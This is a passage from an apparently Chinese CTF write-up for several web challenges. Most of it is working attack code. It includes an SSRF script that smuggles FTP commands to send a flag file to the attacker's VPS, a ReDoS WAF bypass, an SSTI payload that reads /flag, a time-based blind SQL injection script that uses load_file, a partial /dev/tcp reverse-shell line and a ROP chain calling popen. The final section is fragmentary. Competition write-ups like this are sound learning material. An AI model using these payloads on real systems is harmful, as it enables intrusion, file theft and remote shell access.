        ret = u""
        for i in raw:
            ret += chr(0xff00+ord(i))
        return ret
    #url_payload = url_payload + payload.replace("\n","\uff0d\uff0a")
    #url_payload = url_payload + payload.replace(" ","\uff20").replace("\n","\uff0d\uff0a")
    url_payload = url_payload + payload_encode(payload)
    print(url_payload)
    json = {
        "url":url_payload
    }
    req = r.post(url+"home",headers=headers,json=json)
    print(req.text)
这里事实上就是最终的payload，在不知道账号密码的情况下使用匿名模式登录，USER为`anonymous`密码随意
切换到`files`文件夹后打开主动传输模式，使用`PORT`和`RETR`向vps发送flag
发送请求，这里根据`docker-compose.yml`给出的内容知道ftp的hostname为`ftp`
这里有个点就是`node`的`http`只支持`http`协议，如果你去打`ftp://`是会解析失败的，监听自己的端口也可以发现这一点。但是我们可以用`http://`构造一个`ftp`的`tcp`包，原理是一样的。
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    url_payload = "http://ftp:8899/"
    payload ='''
    USER anonymous
    PASS admin888
    CWD files
    TYPE I
    PORT vpsip,0,1890
    RETR flag
    '''.replace("\n","\r\n")
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0xff00+ord(i))
        return ret
    #url_payload = url_payload + payload.replace("\n","\uff0d\uff0a")
    #url_payload = url_payload + payload.replace(" ","\uff20").replace("\n","\uff0d\uff0a")
    url_payload = url_payload + payload_encode(payload)
    print(url_payload)
    json = {
        "url":url_payload
    }
    req = r.post(url+"home",headers=headers,json=json)
    print(req.text)
监听ftp发来的数据
    import socket
    HOST = '0.0.0.0'
    PORT =  1890
    blocksize = 4096
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            while 1:
                data = conn.recv(blocksize)
                print(data)
                if not data:
                    break
        print('end.')
拿到flag
## wwwafed_app
市面上绝大多数WAF都采取正则匹配机制，然而若WAF的正则本身具有漏洞，就可能在引起非常慢的匹配速度，消耗WAF资源，也造成被保护网站的不可用。这种情况被称为ReDOS（正则表达式DOS）。案例：
ReDOS的原理是：使用NFA的正则引擎对于特定的模式串，在匹配过程中会回溯，而回溯次数是指数上升的。典型的漏洞模式有重复符嵌套(`(x+)*y`)，重复符相邻(`.*d+.`)等。
    import re,sys
    import timeout_decorator
    @timeout_decorator.timeout(5)
    def waf(url):
        # only xxx.yy-yy.zzz.mrctf.fun allow
        pat = r'^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$'
        if re.match(pat,url) is None:
            print("BLOCK",end='') # 拦截
        else:
            print("PASS",end='') # 不拦截
    if __name__ == "__main__":
        try:
            waf(sys.argv[1])
        except:
            print("PASS",end='')
WAF代码给出，可见其对每个正则有着五秒的执行时间限制，超出时间默认采取放行策略。这个正则是一个典型的漏洞，构造一个REDOS正则即可验证效果：
    aaaaaaaaaaaaaaaaaaaaaaaaaa{
绕过了WAF，接下来就简单了。应用只有这一个输入点，尝试SSTI就可以拿到flag。
    aaaaaaaaaaaaaaaaaaaaaaaaaa{{''.__class__.__mro__[1].__subclasses__()[94].get_data(0,"/flag")}}
P.S.这里应该不能采取命令注入
        import shlex
      safeurl = shlex.quote((base64.b64decode(url).decode('utf-8')))
        block = os.popen("python3 waf.py " + safeurl).read()
## web_check_in
首先是个登录页面
由于输入什么东西都没回显  
不难想到这是个时间盲注  
我们sleep和bench_mark都睡不了  
我们就可以构造mysql查询时间较长的语句来进行sql注入  
（本脚本用的是笛卡尔积）  
由于目录遍历的时候可以扫到hint.php和shell.php  
我们可以想到sql注入需要的就是读文件
    import time
    import requests
    url_1 = 'http://xxx:xxx/?username='
    url_2 = '&password=123'
    url = ''
    print('Processing...')
    i = 1
    content = ''
    while True:
        low = 32
        high = 127
        mid = low
        while high > mid:
            payload = "admin' and if(ascii(substr((select(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))),{},1))like {},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0) -- + ".format(
                i, mid)
            url = url_1 + payload + url_2
            time_1 = time.time()
            print(url)
            try:
                res = requests.get(url=url, verify=False,timeout=2)
            except:
                pass
            time_2 = time.time()
            time_offset = time_2 - time_1
            if time_offset > 2:
                content += chr(mid)
                break
            else:
                mid += 1
        i += 1
        if i == 7:
            print(content)
            break
我们读到的shell
    &/dev/tcp/xxxxxx/6666 0>&1"'
    stack_base = 0x00007fecae238000
    stack_offset = 0x48d0
    stack_addr = stack_base-stack_offset
    #offset a =0x108
    layout = [
        '\x00'*0x108,
        pop_rdi_ret,
        stack_addr+0x80,
        pop_rsi_ret,
        stack_addr+0x18,
        pop_rax_ret,
        p64(0),
        ret,
        popen_addr,
        'r'+'\x00'*0x7,
        '\x00'*0x60,
        command.ljust(0x60, '\x00'),
        "a"*0x8
    ]
    buf = flat(layout)
    url = "xxx"
    attack(url=url,payload=buf)
就可以反弹shell了  
之后我们  
连上得到flag